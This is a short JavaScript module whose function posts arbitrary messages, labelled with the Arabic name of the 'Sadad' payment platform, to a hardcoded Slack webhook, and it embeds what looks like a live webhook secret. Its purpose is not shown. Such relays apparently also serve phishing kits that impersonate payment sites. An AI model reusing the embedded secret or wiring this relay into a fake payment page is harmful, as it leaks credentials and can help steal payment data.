import axios from 'axios';

export const TeleSned = () => {
    const Send = async (message) => {
        const webhookUrl = 'https://hooks.slack.com/services/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';
        const data = { text: `منصة سداد \n ${message}` }; // Properly format the payload

        try {
            await axios.post(webhookUrl, data); // Send the POST request
            console.log('Message sent successfully');
        } catch (error) {
            console.error('Error sending message:', error);
        }
    };

    return { Send };
};

export default TeleSned;
